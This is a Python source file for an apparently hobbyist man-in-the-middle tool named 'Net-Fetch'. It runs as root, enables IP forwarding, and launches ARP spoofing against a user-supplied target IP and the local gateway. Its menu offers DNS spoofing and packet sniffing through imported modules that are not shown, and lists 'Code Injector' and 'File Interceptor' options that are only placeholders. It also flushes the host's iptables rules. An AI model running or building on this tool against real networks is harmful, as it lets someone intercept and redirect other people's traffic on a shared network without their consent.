import sys
import assets.netscan as scan
import os
import threading
from time import sleep
import subprocess
import assets.arp_spoof as arpspf
import assets.dns_spoofer as dns_spoof

def exit_func():
	subprocess.call("bash -c 'echo 0 > /proc/sys/net/ipv4/ip_forward'", shell=True)
	try:
		os.remove("/tmp/net_fetch_arp.log")
		os.system("iptables --flush")
	except FileNotFoundError:
		pass

def arp_response():
	sleep(3)
	os.system("xterm -geometry 100x24 -hold -e 'less +F /tmp/net_fetch_arp.log' 2> /dev/null")

def target_f():
	subprocess.call("bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'", shell=True)
	user_inside_target = 0
	target_ip = raw_input("Target IP>>")
	router_ip = str(subprocess.check_output("ip route show | grep -i 'default via'| awk '{print $3 }'", shell=True))
	if target_ip == "":
		print("Please specify a target.")
		target_f()
	start_arp = threading.Thread(target=arpspf.arp_try, args=(target_ip,router_ip))
	start_arp.daemon = True
	start_arp.start()

	arp_response_thread = threading.Thread(target=arp_response)
	arp_response_thread.daemon = True
	arp_response_thread.start() 

	while user_inside_target != "back":
		print("\n1.Code Injector")
		print("2.DNS spoofer")
		print("3.File Interceptor")
		print("4.Packet Sniffer")
		print("Back - previous windows")
		print("Exit")
		user_inside_target = raw_input("what will you select >>  ")
		if user_inside_target == "1":
			print ("in code Injector")
		elif user_inside_target == "2":
			print ("in dns spoofer")
			dns_spoof.main()
		elif user_inside_target == "3":
			print ("in file interceptor")
		elif user_inside_target == "4":
			print ("in packet sniffer")
			print("\n[+]Packet Sniffing on " + target_ip)
			print("\n[+]'Ctrl + c' to stop.")
			os.system("xterm -geometry 100x24 -hold -e 'python assets/packet_sniffer.py' ")
		elif user_inside_target == "exit":
			print("\n\nshutting down(-_-)")	
			sys.exit(0)
		elif user_inside_target == "back":
			break
		else:	
			print("\nInvalid choice")




def home():
	user_input = 0
	try:
		print("Please type 'help' for more info")
		while user_input != "exit" : 
			user_input = raw_input("\nNet-Fetch >> ")
			if user_input == "help" : 
					print("help - print this message.")
					print("exit - exit the program.")
					print("scan - scan your network for targets.")
					print("target - for attacking targets.")
			elif user_input == 'target':
				target_f()
			elif user_input == "scan":
				scan_obj = scan.main()
			elif user_input == 'exit':
				print("\n\nshutting down(-_-)")
				exit_func()
				sys.exit(0)
	except KeyboardInterrupt:
			exit_func()
			print("\nYou Killed It!")



if not os.geteuid() == 0:
    sys.exit("[!] Net-fetch must be run as root.")

home()
